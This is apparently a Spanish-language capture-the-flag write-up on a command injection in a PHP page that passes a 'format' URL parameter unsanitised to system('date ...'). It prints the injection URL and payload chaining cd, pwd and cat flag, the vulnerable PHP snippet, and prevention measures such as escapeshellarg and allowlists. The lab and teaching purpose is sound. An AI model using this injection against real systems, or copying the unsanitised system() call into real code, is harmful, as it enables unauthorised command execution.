🔥 Resumen del Reto
Este desafío consistió en explotar una vulnerabilidad de inyección de comandos en una aplicación web que procesaba un parámetro format en la URL. El objetivo era leer el archivo flag.txt inyectando comandos a través del parámetro. ¡Hack the Planet! 🌍💻

🧠 Detalles de la Explotación
💻 URL Vulnerable
bash
http://94.237.53.203:55075/?format=date%20%27+;%20cd%20..%20;%20pwd;%20cat%20flag%27
# Traducción: date '; cd .. ; pwd; cat flag'
🛠️ Análisis Técnico
🔧 Comando Base:

La app usaba date con parámetro de formato ⏳

Uso normal: ?format=Y-m-d → date "Y-m-d"

🔗 Codificación URL:

%20 = Espacio ( )

%27 = Comilla simple (')

%3B = Punto y coma (;) [no usado aquí pero común]

💣 Payload Malicioso:

bash
date ''; cd ..; pwd; cat flag'
# 🎯 Rompe la consulta original y añade comandos
⚡ Comandos Ejecutados:

bash
1. date ''        # Comando original neutralizado
2. cd ..          # 📂 Navegación de directorios
3. pwd            # 🗺️ Verificación de ruta (opcional)
4. cat flag       # 🏁 ¡Obtención de la flag!
🕵️ ¿Cómo Funcionó?
La aplicación vulnerable tenía este flujo:

php
<?php
$format = $_GET['format'];
system("date '$format'");  # ¡Peligro! Input sin sanitizar
?>
🛡️ Medidas de Prevención
Tácticas de Seguridad	Ejemplos
🔐 Validación de Input	filter_var()
🚫 Listas Blancas	Solo permitir Y-m-d, H:i:s
⚔️ Escapado de Caracteres	escapeshellarg()
🛑 Evitar Comandos Shell	Usar DateTime() de PHP
📌 Lecciones Aprendidas
Nunca confíes en el input del usuario 🚨

Los parámetros URL son vectores comunes de ataque 🎯

Siempre sanitiza y valida los datos 🔍

Usa alternativas seguras a system()/exec() 🛡️

¡Happy Hacking! 😈💻 (pero solo en entornos autorizados)